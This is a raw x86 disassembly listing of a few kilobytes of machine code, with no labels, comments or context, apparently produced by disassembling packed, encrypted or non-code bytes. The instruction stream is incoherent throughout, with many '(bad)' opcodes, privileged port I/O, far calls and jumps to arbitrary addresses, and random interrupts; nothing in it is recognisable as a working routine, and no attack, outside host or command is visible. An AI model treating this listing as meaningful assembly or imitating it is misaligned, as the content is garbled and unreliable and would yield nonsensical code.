  411b02:	sbb    BYTE PTR [ebx-0x56],ah
  411b05:	lods   eax,DWORD PTR ds:[esi]
  411b06:	or     al,BYTE PTR [ecx-0x47399e3b]
  411b0c:	xchg   bh,dl
  411b0e:	xchg   ebx,eax
  411b0f:	enter  0xfcbf,0x4c
  411b13:	push   ds
  411b14:	(bad)
  411b17:	adc    al,0x64
  411b19:	mov    edi,0x1e788254
  411b1e:	mov    dh,0xc0
  411b20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b21:	ins    BYTE PTR es:[edi],dx
  411b22:	add    al,0xc4
  411b24:	dec    edx
  411b25:	lods   al,BYTE PTR ds:[esi]
  411b26:	add    eax,0x7e016771
  411b2b:	lea    esp,[ecx-0x2aebd9ac]
  411b31:	cld    
  411b32:	cmp    al,0xf3
  411b34:	hlt    
  411b35:	retf   0x6645
  411b38:	daa    
  411b39:	pop    esi
  411b3a:	sub    edx,DWORD PTR [esi-0x49aa5c70]
  411b40:	mov    dh,0xe
  411b42:	push   cs
  411b43:	push   eax
  411b44:	push   ss
  411b45:	sahf   
  411b46:	cli    
  411b47:	in     eax,dx
  411b48:	loop   0x411b36
  411b4a:	jmp    0x7b76c15
  411b4f:	push   ds
  411b50:	ret    0xd488
  411b53:	inc    ebx
  411b54:	push   ss
  411b55:	leave  
  411b56:	inc    ebp
  411b57:	jle    0x411b81
  411b59:	int3   
  411b5a:	fsub   DWORD PTR [ebx+0x38]
  411b5d:	hlt    
  411b5e:	pop    ecx
  411b5f:	shl    BYTE PTR [ebp-0x7c5f3ed],0xfe
  411b66:	push   0x6275c35d
  411b6b:	or     eax,0x3a9feab2
  411b70:	or     BYTE PTR [eax+0x4c9c1a57],bl
  411b76:	aam    0x99
  411b78:	call   0x518c:0xe83d1f3d
  411b7f:	aam    0x78
  411b81:	xor    al,0xd8
  411b83:	loopne 0x411b6a
  411b85:	jmp    0x411b26
  411b87:	mov    ecx,DWORD PTR [edi+eax*8-0x1f85c622]
  411b8e:	dec    ebx
  411b8f:	mov    ecx,0xb65f45e9
  411b94:	rcl    DWORD PTR [esi+0x3e],0x6d
  411b98:	jae    0x411c17
  411b9a:	mov    edx,0x4c0630a4
  411b9f:	adc    BYTE PTR [esi+0x7d2cdc8],dh
  411ba5:	add    dh,BYTE PTR [esi]
  411ba7:	sbb    cl,BYTE PTR [esi]
  411ba9:	or     dh,BYTE PTR ds:0xf46a466e
  411baf:	pop    esp
  411bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bb1:	push   cs
  411bb2:	jbe    0x411b92
  411bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bb5:	fs pushf 
  411bb7:	or     al,0x85
  411bb9:	mov    al,BYTE PTR [edi+ebx*4]
  411bbc:	ds push edi
  411bbe:	jge    0x411baa
  411bc0:	adc    ah,dh
  411bc2:	fdiv   st,st(7)
  411bc4:	ret    
  411bc5:	mov    esp,0x9dc812be
  411bca:	or     edx,DWORD PTR [esi+0x1968571f]
  411bd0:	inc    esp
  411bd1:	mov    al,ds:0xf7284ba1
  411bd6:	mov    cl,BYTE PTR [eax-0x1f]
  411bd9:	pop    ds
  411bda:	sub    DWORD PTR [edx+0x21],esp
  411bdd:	dec    edi
  411bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bdf:	jbe    0x411c5b
  411be1:	push   esp
  411be2:	sar    BYTE PTR [edi],0x2b
  411be5:	lds    ebx,FWORD PTR [eax+edx*2-0x1c5ae0b9]
  411bec:	push   ecx
  411bed:	dec    ebp
  411bee:	pop    esi
  411bef:	sbb    al,0xe4
  411bf1:	jp     0x411bb3
  411bf3:	arpl   cx,sp
  411bf5:	adc    al,0x48
  411bf7:	xor    bh,ch
  411bf9:	fcom   st(3)
  411bfb:	int    0xd2
  411bfd:	inc    edx
  411bfe:	jnp    0x411c61
  411c00:	jmp    0x951f:0x11bbad3e
  411c07:	aad    0xad
  411c09:	and    al,0x66
  411c0b:	add    DWORD PTR [ebx-0x6a],eax
  411c0e:	cmp    DWORD PTR [eax+edi*4],edi
  411c11:	clc    
  411c12:	dec    eax
  411c13:	pop    esp
  411c14:	gs pop es
  411c16:	ss xchg ebx,eax
  411c18:	mov    ch,0x7c
  411c1a:	inc    ebx
  411c1b:	sub    edx,DWORD PTR [edx+0x186bd5e]
  411c21:	push   ss
  411c22:	push   ebp
  411c23:	pop    ss
  411c24:	popa   
  411c25:	mov    bl,0x33
  411c27:	test   al,0xa0
  411c2a:	sbb    eax,0x711d2be8
  411c2f:	jb     0x411be2
  411c31:	into   
  411c32:	mov    eax,ds:0xc470559f
  411c37:	cmc    
  411c38:	js     0x411c24
  411c3a:	(bad)  
  411c3b:	push   esi
  411c3c:	gs sbb eax,0xbd689c44
  411c42:	lahf   
  411c43:	(bad)  
  411c45:	ds and al,dh
  411c48:	mov    DWORD PTR [ebp-0x47f50b9f],edx
  411c4e:	test   al,0x88
  411c50:	ss aaa 
  411c52:	daa    
  411c53:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c55:	or     BYTE PTR [ebp-0x27],al
  411c58:	mov    edx,0xfe1fcd7e
  411c5d:	push   ebx
  411c5e:	jl     0x411c6f
  411c60:	(bad)  
  411c61:	retf   0xc567
  411c64:	enter  0x786b,0x7b
  411c68:	adc    ebx,edx
  411c6a:	or     al,0x2c
  411c6c:	mov    ah,0x69
  411c6e:	addr16 jns 0x411c41
  411c71:	rol    DWORD PTR [edx+ebx*8+0x13],cl
  411c75:	out    dx,al
  411c76:	jae    0x411cc3
  411c78:	scas   eax,DWORD PTR es:[edi]
  411c79:	or     DWORD PTR [eax-0x4f],eax
  411c7c:	mov    ss:0x657f213b,eax
  411c82:	pop    ebx
  411c83:	adc    eax,0x1c417960
  411c88:	in     al,0x57
  411c8a:	jg     0x411ced
  411c8c:	mov    ch,0x20
  411c8e:	push   0x10
  411c90:	jnp    0x411cfb
  411c92:	loope  0x411cc2
  411c94:	cmp    DWORD PTR ds:0x5bab2cfe,ecx
  411c9a:	dec    edx
  411c9b:	pop    ecx
  411c9c:	sbb    eax,0x9179262f
  411ca1:	pop    esi
  411ca2:	mov    ebp,0xcc443887
  411ca7:	call   0xc649:0x7ccddc9c
  411cae:	push   DWORD PTR [ecx]
  411cb0:	ins    DWORD PTR es:[edi],dx
  411cb1:	push   cs
  411cb2:	sbb    eax,0xded9696
  411cb7:	es leave 
  411cb9:	sub    DWORD PTR [esi-0x65],edi
  411cbc:	fld    QWORD PTR [esp+ecx*8-0x78a562d2]
  411cc3:	sub    dh,BYTE PTR [edi-0x59]
  411cc6:	adc    bh,BYTE PTR [esi+0x45]
  411cc9:	push   esp
  411cca:	add    esp,DWORD PTR [edx+0x73651797]
  411cd0:	xor    al,0xaf
  411cd2:	cld    
  411cd3:	je     0x411d36
  411cd5:	in     eax,dx
  411cd6:	xchg   ebx,eax
  411cd7:	in     eax,dx
  411cd8:	loope  0x411d0c
  411cda:	cdq    
  411cdb:	xlat   BYTE PTR ds:[ebx]
  411cdc:	out    dx,al
  411cdd:	dec    edx
  411cde:	jl     0x411d46
  411ce0:	outs   dx,BYTE PTR ds:[esi]
  411ce1:	dec    edi
  411ce2:	sar    BYTE PTR [ebx-0x44],0xec
  411ce6:	dec    esi
  411ce7:	sub    dl,BYTE PTR [ebp+0x123a873d]
  411ced:	pop    ebp
  411cee:	mov    al,ds:0xd9276670
  411cf3:	mov    cl,0x49
  411cf5:	cmp    eax,0xadf9978a
  411cfa:	mov    ah,0xde
  411cfc:	fwait
  411cfd:	popa   
  411cfe:	lods   al,BYTE PTR ds:[esi]
  411cff:	and    ah,0x13
  411d02:	mov    dl,0x1e
  411d04:	cmc    
  411d05:	jmp    ecx
  411d07:	mov    al,0x7d
  411d09:	fchs   
  411d0b:	pop    esp
  411d0c:	adc    eax,0xef33df4e
  411d11:	and    ebx,esi
  411d13:	inc    esi
  411d14:	cdq    
  411d15:	mov    esp,cs
  411d17:	paddusb mm3,QWORD PTR [ecx+0x1a]
  411d1b:	cmp    bh,BYTE PTR [ecx+0x5c]
  411d1e:	jae    0x411ce3
  411d20:	and    dh,BYTE PTR [ebp-0x79d93a39]
  411d26:	mov    ds:0x5f1f3c69,al
  411d2b:	mov    ebp,0xd12c79cc
  411d30:	xchg   esp,eax
  411d31:	or     BYTE PTR ds:0x4e2bc79f,dh
  411d37:	pop    es
  411d38:	mov    cl,0x4d
  411d3a:	pusha  
  411d3b:	data16 test al,0x8c
  411d3e:	bound  eax,QWORD PTR [eax+0x3c8e0ac2]
  411d44:	in     eax,0xb1
  411d46:	jae    0x411d1e
  411d48:	xchg   esp,eax
  411d49:	sbb    BYTE PTR [esi],al
  411d4b:	popa   
  411d4c:	std    
  411d4d:	pop    esi
  411d4e:	(bad)  
  411d4f:	hlt    
  411d50:	inc    edx
  411d51:	dec    edx
  411d52:	sub    eax,0xdd566c8
  411d57:	jo     0x411d88
  411d59:	pop    ss
  411d5a:	retf   0x9228
  411d5d:	enter  0x1d3c,0x1c
  411d61:	aam    0x0
  411d63:	retf   
  411d64:	pop    eax
  411d65:	shl    DWORD PTR [ebx-0x510bc5b],cl
  411d6b:	xchg   ecx,eax
  411d6c:	pop    ebx
  411d6d:	xor    al,bl
  411d6f:	dec    ebp
  411d70:	out    0x86,al
  411d72:	adc    ch,al
  411d74:	(bad)  
  411d75:	call   0x6df0bfa4
  411d7a:	push   cs
  411d7b:	cmp    BYTE PTR [edi],0x1c
  411d7e:	and    BYTE PTR [edx-0x2f3afe07],ch
  411d84:	xor    DWORD PTR [edi],edi
  411d86:	movaps XMMWORD PTR [ebp-0x141e85cc],xmm7
  411d8d:	jmp    0x197a92d
  411d92:	mov    ds:0x38edb518,al
  411d97:	sub    al,0xae
  411d99:	sbb    eax,0x2d12bf15
  411d9e:	loope  0x411d59
  411da0:	(bad)  
  411da1:	aam    0xa8
  411da3:	xor    al,0x58
  411da5:	sbb    eax,0x418df44c
  411daa:	and    esp,DWORD PTR [edx+0x17]
  411dad:	or     eax,0x5d0c8f7
  411db2:	mov    al,0x1b
  411db4:	mov    ah,BYTE PTR [ebx]
  411db6:	push   ebp
  411db7:	test   BYTE PTR [edi+0x77ea6869],cl
  411dbd:	sbb    eax,0xd6dc8ac2
  411dc2:	and    esi,edx
  411dc4:	out    dx,eax
  411dc5:	test   BYTE PTR [edi],bl
  411dc7:	stc    
  411dc8:	add    bh,BYTE PTR [edi]
  411dca:	jle    0x411d77
  411dcc:	pop    ebx
  411dcd:	stc    
  411dce:	ficomp WORD PTR [eax-0x12]
  411dd1:	test   al,0x15
  411dd4:	xor    eax,0x7c4c1163
  411dd9:	jno    0x411d7b
  411ddb:	sahf   
  411ddc:	aas    
  411ddd:	xchg   DWORD PTR [edx],ecx
  411ddf:	bound  edi,QWORD PTR [edi-0x30e1654e]
  411de5:	xor    eax,0xa68d6ec8
  411dea:	stc    
  411deb:	xor    BYTE PTR [edx+0x72],dh
  411dee:	cmp    eax,0xdbd548b1
  411df3:	jp     0x411e64
  411df5:	cmc    
  411df6:	fldenv [edx+0xd]
  411df9:	ffreep st(4)
  411dfb:	mov    eax,0xf323f57c
  411e00:	push   ecx
  411e01:	sbb    al,dh
  411e03:	pop    ebp
  411e04:	arpl   WORD PTR [ecx-0x4f6ea2f4],bx
  411e0a:	ins    DWORD PTR es:[edi],dx
  411e0b:	cmp    DWORD PTR [ebx+0x582fbb82],esp
  411e11:	xchg   ecx,eax
  411e12:	ja     0x411df3
  411e14:	pushf  
  411e15:	inc    ebp
  411e16:	mov    esi,0x175194ed
  411e1b:	sbb    eax,0xe2ad65b7
  411e20:	in     al,dx
  411e21:	or     DWORD PTR [ebx-0x36],esi
  411e24:	dec    ecx
  411e25:	push   es
  411e26:	or     ah,BYTE PTR [ebx]
  411e28:	xchg   edi,esi
  411e2a:	(bad)  
  411e2b:	xor    BYTE PTR [esi+0x18],bl
  411e2e:	loop   0x411e43
  411e30:	push   esi
  411e31:	ins    DWORD PTR es:[edi],dx
  411e32:	or     eax,0xf92abf6f
  411e37:	and    al,0x4b
  411e39:	pop    esi
  411e3a:	fiadd  DWORD PTR [ecx+0x5ca589fc]
  411e40:	jno    0x411de9
  411e42:	cmp    eax,0x90e8a744
  411e47:	mov    esp,0x7f22356d
  411e4c:	xchg   ebx,eax
  411e4d:	rol    eax,0x22
  411e50:	xchg   DWORD PTR [ebp+0x349b68b],ebp
  411e56:	pop    ds
  411e57:	jnp    0x411e90
  411e59:	lock inc eax
  411e5b:	mov    ah,0xe6
  411e5d:	rol    BYTE PTR [ebx],cl
  411e5f:	fs loop 0x411eb4
  411e62:	(bad)  [esi+0x78]
  411e65:	pop    edi
  411e66:	int3   
  411e67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e68:	xchg   edi,eax
  411e69:	jg     0x411ece
  411e6b:	sub    esp,edx
  411e6d:	dec    ecx
  411e6e:	mov    bl,BYTE PTR [esp+ebp*4+0x36]
  411e72:	fsub   DWORD PTR [edx]
  411e74:	mov    bl,0xf
  411e76:	ret    
  411e77:	out    dx,eax
  411e78:	cli    
  411e79:	add    esi,ebp
  411e7b:	dec    ebp
  411e7c:	js     0x411e9e
  411e7e:	or     edx,DWORD PTR [edi+eax*2]
  411e81:	(bad)  
  411e82:	pop    ecx
  411e83:	(bad)  
  411e84:	dec    esi
  411e85:	cmovge esi,DWORD PTR [edx+edi*8-0x4220488c]
  411e8d:	imul   esp,DWORD PTR [eax-0x6998846b],0xba675364
  411e97:	or     bh,BYTE PTR [ebp+ecx*4-0x79]
  411e9b:	scas   eax,DWORD PTR es:[edi]
  411e9c:	sbb    DWORD PTR [edx],ecx
  411e9e:	int    0xc3
  411ea0:	cld    
  411ea1:	(bad)  
  411ea2:	lods   eax,DWORD PTR ds:[esi]
  411ea3:	mov    dh,0xc6
  411ea5:	or     DWORD PTR [eax-0x7a],ebx
  411ea8:	dec    eax
  411ea9:	mov    esi,0x838e5a94
  411eae:	sar    ch,0x94
  411eb1:	sub    eax,0x19c0b0a3
  411eb6:	dec    esi
  411eb7:	mov    DWORD PTR [edx],ebp
  411eb9:	mov    dl,0xd8
  411ebb:	mov    DWORD PTR [ebx+0x35],ebx
  411ebe:	xchg   edx,eax
  411ebf:	cmp    eax,0x323f895e
  411ec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ec5:	xor    al,0x82
  411ec7:	sti    
  411ec8:	popa   
  411ec9:	das    
  411eca:	push   ebx
  411ecb:	mov    esp,0xcfb5afed
  411ed0:	mov    esi,?
  411ed2:	out    dx,eax
  411ed3:	popa   
  411ed4:	mov    ebp,0xd67dd065
  411ed9:	out    0x7d,eax
  411edb:	mov    ds:0xa39b6e79,al
  411ee0:	cs xchg ecx,eax
  411ee2:	adc    edx,DWORD PTR [ebx]
  411ee4:	inc    eax
  411ee5:	cmc    
  411ee6:	movntps XMMWORD PTR [ebp+0x2c39945a],xmm2
  411eed:	jo     0x411ed9
  411eef:	inc    edi
  411ef0:	cmc    
  411ef1:	pushf  
  411ef2:	push   0x6a
  411ef4:	xchg   ebx,eax
  411ef5:	mov    dl,0x2d
  411ef7:	fwait
  411ef8:	ins    DWORD PTR es:[edi],dx
  411ef9:	fdivr  QWORD PTR [edx]
  411efb:	enter  0x9aaa,0x18
  411eff:	adc    BYTE PTR [esi+0x107b5214],dh
  411f05:	push   ebp
  411f06:	pop    ds
  411f07:	popf   
  411f08:	adc    eax,DWORD PTR [eax+edi*1]
  411f0b:	dec    ebx
  411f0c:	xor    eax,ebx
  411f0e:	mov    edx,0x98d04cf
  411f13:	fbstp  TBYTE PTR ds:0x9a53eb1
  411f19:	xlat   BYTE PTR ds:[ebx]
  411f1a:	xchg   esp,eax
  411f1b:	mov    ds:0xdf2236ac,al
  411f20:	not    ebx
  411f22:	inc    esp
  411f23:	pop    DWORD PTR [ebx]
  411f25:	push   es
  411f26:	imul   edi,DWORD PTR [esi],0x69
  411f29:	retf   
  411f2a:	jecxz  0x411f6f
  411f2c:	mov    WORD PTR [edx+edx*8-0x10c9c43a],?
  411f33:	jae    0x411eec
  411f35:	loope  0x411f76
  411f37:	mov    ecx,0x372e6d38
  411f3c:	fscale 
  411f3e:	into   
  411f3f:	int    0xf2
  411f41:	push   cs
  411f42:	mov    dl,0x45
  411f44:	movhps QWORD PTR [ebx+ebp*8+0x5dafa72],xmm2
  411f4c:	repz sbb bl,bh
  411f4f:	mov    bl,0x6c
  411f51:	leave  
  411f52:	into   
  411f53:	dec    eax
  411f54:	pop    eax
  411f55:	punpckhwd mm3,QWORD PTR [edx+0x2a]
  411f59:	retf   0xf7ef
  411f5c:	out    0xd1,al
  411f5e:	lahf   
  411f5f:	xchg   esi,eax
  411f60:	cli    
  411f61:	mov    edi,0xefe6ba50
  411f66:	iret   
  411f67:	(bad)  
  411f68:	or     BYTE PTR [ebx+0x4a],dl
  411f6b:	mov    bh,0x79
  411f6d:	leave  
  411f6e:	push   ds
  411f6f:	arpl   WORD PTR [ebx],bp
  411f71:	ret    
  411f72:	dec    ebx
  411f73:	and    al,BYTE PTR [edx-0x3b]
  411f76:	jnp    0x411f4f
  411f78:	scas   al,BYTE PTR es:[edi]
  411f79:	inc    edi
  411f7a:	sar    dh,1
  411f7c:	mov    BYTE PTR [esi-0x34],al
  411f7f:	cmp    ebx,DWORD PTR [ecx]
  411f81:	aam    0xbb
  411f83:	jmp    0xe1503483
  411f88:	jae    0x411ffa
  411f8a:	mov    esi,0x4679317a
  411f8f:	pop    edx
  411f90:	outs   dx,DWORD PTR ds:[esi]
  411f91:	sbb    al,0xc5
  411f93:	pop    es
  411f94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f95:	adc    eax,0xffba59c8
  411f9a:	inc    ebx
  411f9b:	aam    0xb4
  411f9d:	ret    
  411f9e:	stos   DWORD PTR es:[edi],eax
  411f9f:	xchg   edx,eax
  411fa0:	sbb    BYTE PTR ds:0x53997855,0x87
  411fa7:	adc    eax,0x9341ca1f
  411fac:	das    
  411fad:	xchg   esi,eax
  411fae:	push   ds
  411faf:	sbb    al,0x95
  411fb1:	push   esi
  411fb2:	lea    edi,[esi+0x12]
  411fb5:	(bad)  
  411fb6:	fistp  DWORD PTR [ebx]
  411fb8:	mov    eax,0xf1395fff
  411fbd:	js     0x411fc7
  411fbf:	repnz sub ch,cl
  411fc2:	test   al,0x91
  411fc4:	xor    eax,0x70d4e0d0
  411fc9:	out    dx,al
  411fca:	es dec ecx
  411fcc:	mov    dh,dh
  411fce:	xchg   ebp,eax
  411fcf:	ret    
  411fd0:	dec    edi
  411fd1:	or     dl,BYTE PTR [ebx-0x6c266498]
  411fd7:	and    edi,esp
  411fd9:	dec    edx
  411fda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fdb:	jecxz  0x41201f
  411fdd:	hlt    
  411fde:	hlt    
  411fdf:	xor    al,0xdd
  411fe1:	fwait
  411fe2:	cmp    eax,0x2ad44b9a
  411fe7:	dec    edi
  411fe8:	mov    ds:0xe1748d96,al
  411fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fee:	adc    DWORD PTR [esi+0x7b],esp
  411ff1:	push   es
  411ff2:	iret   
  411ff3:	dec    ebx
  411ff4:	xchg   esi,eax
  411ff5:	sub    ah,al
  411ff7:	leave  
  411ff8:	call   edi
  411ffa:	out    dx,eax
  411ffb:	mov    ah,0xe0
  411ffd:	stc    
  411ffe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fff:	mov    ebp,0xc6f80fe7
  412004:	fst    QWORD PTR [edi-0x5da203a5]
  41200a:	or     bl,bh
  41200c:	into   
  41200d:	mov    eax,0xc89a6f3e
  412012:	fst    DWORD PTR [ebx-0x7edbc8eb]
  412018:	sbb    ecx,eax
  41201a:	pop    edx
  41201b:	repz popf 
  41201d:	cmp    BYTE PTR [edx+ebp*4],bh
  412020:	dec    edi
  412021:	mov    esi,0x346ec614
  412026:	shl    DWORD PTR [edi+0x59],1
  412029:	stos   DWORD PTR es:[edi],eax
  41202a:	mov    fs,WORD PTR [ebp-0x7c33e9]
  412030:	ret    0x3780
  412033:	pop    ebp
  412034:	aam    0xd6
  412036:	loope  0x412040
  412038:	mov    eax,0x50a00b40
  41203d:	das    
  41203e:	inc    esp
  41203f:	ret    
  412040:	jo     0x4120af
  412042:	call   0x6a87306e
  412047:	jmp    0x411fe8
  412049:	(bad)  
  41204a:	sbb    DWORD PTR [edx+0x53],eax
  41204d:	stos   DWORD PTR es:[edi],eax
  41204e:	(bad)  
  41204f:	stos   BYTE PTR es:[edi],al
  412050:	sub    esp,DWORD PTR [ebp-0xdaac451]
  412056:	inc    esp
  412057:	cmp    BYTE PTR [edx+ebp*8+0x1f],ch
  41205b:	jb     0x41206c
  41205d:	out    dx,eax
  41205e:	sub    cl,ch
  412060:	inc    edx
  412061:	arpl   WORD PTR [edi+0x10],bx
  412064:	mov    eax,0x5e1fa1fd
  412069:	add    eax,0xa0bdbc06
  41206e:	fcomp  QWORD PTR [edi+ecx*8+0x109524e9]
  412075:	push   edi
  412076:	inc    ebx
  412077:	data16 aad 0x1d
  41207a:	enter  0x97f1,0xe1
  41207e:	jne    0x4120db
  412080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412081:	push   edi
  412082:	ret    0x956f
  412085:	rol    BYTE PTR [edi],1
  412087:	lahf   
  412088:	fsubr  DWORD PTR [esi-0x463c7c3d]
  41208e:	xor    DWORD PTR [edx+edx*1-0x1c4ec972],ebp
  412095:	repnz lds esp,FWORD PTR [edx-0x57962079]
  41209c:	and    eax,0xd75660f7
  4120a1:	leave  
  4120a2:	push   0x15ec1ed7
  4120a7:	aaa    
  4120a8:	iret   
  4120a9:	cmp    esp,DWORD PTR [edi-0x5cbfa8c2]
  4120af:	sbb    eax,0xf5d665f5
  4120b4:	cmc    
  4120b5:	dec    esp
  4120b6:	mov    esp,DWORD PTR [eax+ebx*1-0x5f80b512]
  4120bd:	lds    eax,FWORD PTR [eax+0x59]
  4120c0:	sar    BYTE PTR [ecx-0x29],1
  4120c3:	cmp    dh,ah
  4120c5:	nop
  4120c6:	jb     0x412082
  4120c8:	sti    
  4120c9:	enter  0x20a4,0xef
  4120cd:	mov    gs,ecx
  4120cf:	dec    esi
  4120d0:	inc    edx
  4120d1:	lahf   
  4120d2:	xchg   esi,eax
  4120d3:	in     eax,dx
  4120d4:	in     eax,0x47
  4120d6:	stos   DWORD PTR es:[edi],eax
  4120d7:	out    dx,eax
  4120d8:	xchg   esi,eax
  4120da:	and    bh,0x81
  4120dd:	lock in al,dx
  4120df:	cmp    BYTE PTR [ecx],cl
  4120e1:	sbb    bh,BYTE PTR ds:[eax]
  4120e4:	or     DWORD PTR [ebp+0x6ac7f35a],edx
  4120ea:	pop    esp
  4120eb:	pop    edi
  4120ec:	not    DWORD PTR [edx+0x289eaa2c]
  4120f2:	pop    esp
  4120f3:	dec    ecx
  4120f4:	dec    esp
  4120f5:	leave  
  4120f6:	lods   al,BYTE PTR ds:[esi]
  4120f7:	jp     0x412108
  4120f9:	outs   dx,BYTE PTR ds:[esi]
  4120fa:	fldcw  WORD PTR [edx-0x54]
  4120fd:	(bad)  
  4120ff:	(bad)  
  412101:	imul   eax,DWORD PTR [eax+0x37f5f74b],0x0
  412108:	jb     0x4120f5
  41210a:	sub    DWORD PTR [ecx],edi
  41210c:	in     eax,0x3f
  41210e:	xchg   BYTE PTR [edi],ch
  412110:	ss jmp 0x68923367
  412116:	mov    ch,0x18
  412118:	adc    cl,BYTE PTR [ebp+0x4fff9278]
  41211e:	sub    ah,BYTE PTR [esi]
  412120:	test   al,0xf8
  412122:	mov    esi,0x244a7bc8
  412127:	nop
  412128:	adc    dh,BYTE PTR [esp+0x21e98a7c]
  41212f:	sub    esp,DWORD PTR [ecx+0x7d6332df]
  412135:	ins    DWORD PTR es:[edi],dx
  412136:	bsr    edx,DWORD PTR [esi-0x3403a609]
  41213d:	icebp  
  41213e:	xor    DWORD PTR [edi+edx*2+0x41],esp
  412142:	loop   0x412126
  412144:	or     bl,BYTE PTR [ecx+eiz*8-0x16580e08]
  41214b:	and    dl,bl
  41214d:	dec    eax
  41214e:	cmp    al,0xbe
  412150:	cmp    ebp,DWORD PTR [eax-0x2c]
  412153:	and    eax,0x6c0540ea
  412158:	sahf   
  412159:	xor    bh,BYTE PTR [eax-0x37]
  41215c:	test   al,0x22
  41215e:	cmp    eax,ebx
  412160:	xchg   ebx,eax
  412161:	nop
  412162:	data16 fmulp st(1),st
  412165:	ins    BYTE PTR es:[edi],dx
  412166:	sub    BYTE PTR [eax],0x70
  412169:	xchg   BYTE PTR fs:[esi-0x4b],bh
  41216d:	adc    edi,eax
  41216f:	iret   
  412170:	or     DWORD PTR ds:0xb18d1c3c,edi
  412176:	and    BYTE PTR [edx+eiz*8],ah
  412179:	(bad)  
  41217a:	dec    eax
  41217b:	adc    DWORD PTR [ecx-0x5d],eax
  41217e:	pop    esi
  41217f:	popa   
  412180:	pusha  
  412181:	mov    dl,0x9d
  412183:	sahf   
  412184:	push   esp
  412185:	push   esi
  412186:	push   ebx
  412187:	pop    edi
  412188:	out    dx,eax
  412189:	inc    edi
  41218a:	inc    esi
  41218b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41218c:	loopne 0x412169
  41218e:	mov    BYTE PTR [eax],0x59
  412191:	xchg   edx,eax
  412192:	cmp    ebx,ecx
  412194:	jns    0x412137
  412196:	xchg   ebx,eax
  412197:	mov    bh,BYTE PTR [eax-0x53a1511f]
  41219d:	jg     0x412204
  41219f:	rcl    dl,0x41
  4121a2:	sbb    esp,DWORD PTR ds:0xc970bda4
  4121a8:	xor    al,0x76
  4121aa:	lods   eax,DWORD PTR ds:[esi]
  4121ab:	mov    ebx,0x384bd04b
  4121b0:	sbb    bl,BYTE PTR ds:0x55ecbc88
  4121b6:	xor    esi,DWORD PTR [edx-0x3]
  4121b9:	mov    dl,BYTE PTR [eax]
  4121bb:	dec    ebp
  4121bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121bd:	cmp    eax,0x72d336a8
  4121c2:	sub    al,BYTE PTR ds:0x67f9f676
  4121c8:	lds    edx,FWORD PTR [ebp+0x52]
  4121cb:	inc    edi
  4121cc:	xchg   edx,eax
  4121cd:	lahf   
  4121ce:	jl     0x412248
  4121d0:	cmp    eax,edx
  4121d2:	jmp    0x83e1b960
  4121d7:	add    eax,0x4ca6c8fb
  4121dc:	std    
  4121dd:	and    ebp,0xc9a84748
  4121e3:	xor    DWORD PTR [ecx],ebx
  4121e5:	fsub   QWORD PTR [ebx-0x7f]
  4121e8:	popa   
  4121e9:	xchg   esp,eax
  4121ea:	jo     0x4121c2
  4121ec:	jns    0x41225d
  4121ee:	iret   
  4121ef:	xor    bh,cl
  4121f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121f2:	jbe    0x412211
  4121f4:	push   esi
  4121f5:	xor    BYTE PTR [ebp-0x7],ah
  4121f8:	fucomip st,st(6)
  4121fa:	cwde   
  4121fb:	pushf  
  4121fc:	(bad)  
  4121fd:	retf   0x2d84
  412200:	lods   al,BYTE PTR ds:[esi]
  412201:	mov    dh,0xba
  412203:	daa    
  412204:	loope  0x4121a6
  412206:	popf   
  412207:	inc    ecx
  412208:	lods   eax,DWORD PTR ds:[esi]
  412209:	or     al,0x9a
  41220b:	push   ecx
  41220c:	stos   BYTE PTR es:[edi],al
  41220d:	nop
  41220e:	xor    DWORD PTR [eax],esp
  412210:	jmp    FWORD PTR [ecx+0x27577a2e]
  412216:	enter  0x320a,0x67
  41221a:	inc    eax
  41221b:	sqrtps xmm7,XMMWORD PTR [esi]
  41221e:	xlat   BYTE PTR ds:[ebx]
  41221f:	mov    ebx,0x2d5a8122
  412224:	lods   eax,DWORD PTR ds:[esi]
  412225:	mov    edx,DWORD PTR [edi-0x3b456205]
  41222b:	pop    eax
  41222c:	ss rol dh,0x97
  412230:	pop    edx
  412231:	or     esi,ebp
  412233:	jne    0x4121cd
  412235:	sahf   
  412236:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412237:	and    BYTE PTR [ebx+0x23a94ff3],0x93
  41223e:	or     ecx,DWORD PTR [eax+0x4d]
  412241:	and    eax,DWORD PTR [eax+0x70b2d303]
  412247:	adc    DWORD PTR [esp+ebx*4+0x39],edx
  41224b:	inc    edx
  41224c:	cmc    
  41224d:	mov    ecx,DWORD PTR [ecx+0x32]
  412250:	aas    
  412251:	pop    esp
  412252:	and    esp,esp
  412254:	adc    DWORD PTR [esi],0xb841f7c4
  41225a:	(bad)  
  41225c:	ins    BYTE PTR es:[edi],dx
  41225d:	aas    
  41225e:	xchg   esp,eax
  41225f:	bnd ret 0x5176
  412263:	std    
  412264:	xlat   BYTE PTR ds:[ebx]
  412265:	sub    al,BYTE PTR [ecx+ecx*2+0x38]
  412269:	mov    dh,0xf9
  41226b:	int    0xa6
  41226d:	jp     0x4122d4
  41226f:	pop    edx
  412270:	rol    DWORD PTR [ebp-0x115b3bb5],0xb8
  412277:	sub    dh,BYTE PTR [esi+0x28]
  41227a:	dec    ecx
  41227b:	cmp    al,0x7c
  41227d:	out    0xdb,al
  41227f:	fstp   QWORD PTR [eax]
  412281:	mov    bl,0x3f
  412283:	std    
  412284:	icebp  
  412285:	push   cs
  412286:	or     DWORD PTR [ebx-0x64f9c539],0x31
  41228d:	int3   
  41228e:	addr16 popf 
  412290:	pop    es
  412291:	xor    BYTE PTR [esp+esi*8+0x5aab3d55],dh
  412298:	loopne 0x412282
  41229a:	loop   0x412249
  41229c:	or     eax,0xef216b91
